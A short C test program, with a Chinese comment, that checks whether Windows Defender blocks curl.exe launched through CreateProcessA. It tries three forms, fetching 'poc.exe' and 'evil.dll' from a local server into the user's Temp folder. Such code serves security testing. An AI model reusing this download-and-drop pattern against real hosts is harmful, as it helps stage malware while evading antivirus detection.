/* bisect2.c — Defender 会不会拦 curl.exe 下载型进程创建？ */
#include <stdio.h>
#include <string.h>
#include <windows.h>

static void try(const char* tag, const char* app, const char* cmd) {
  STARTUPINFOA si; PROCESS_INFORMATION pi;
  memset(&si, 0, sizeof si); si.cb = sizeof si;
  SetLastError(0);
  int ok = CreateProcessA(app, (char*)cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
  printf("%-26s ok=%d gle=%lu\n", tag, ok, GetLastError());
  if (ok) {
    WaitForSingleObject(pi.hProcess, 30000);
    DWORD ec = 0; GetExitCodeProcess(pi.hProcess, &ec);
    printf("                           exit=%lu\n", ec);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
  }
}

int main(void) {
  const char* T = "C:\\Users\\wintest\\AppData\\Local\\Temp\\";
  char c1[600], c2[900], c3[900];
  strcpy(c1, "curl.exe -sf -o ");
  strcat(c1, T); strcat(c1, "w4a.exe http://127.0.0.1:8765/poc.exe");
  try("1 curl single rel", NULL, c1);

  strcpy(c2, "C:\\Windows\\System32\\curl.exe -sf -o ");
  strcat(c2, T); strcat(c2, "w4b.exe http://127.0.0.1:8765/poc.exe");
  try("2 curl full path", NULL, c2);

  strcpy(c3, "C:\\Windows\\System32\\curl.exe -sf -o ");
  strcat(c3, T); strcat(c3, "w4c.exe http://127.0.0.1:8765/poc.exe -o ");
  strcat(c3, T); strcat(c3, "w4d.dll http://127.0.0.1:8765/evil.dll");
  try("3 curl two files", NULL, c3);
  return 0;
}
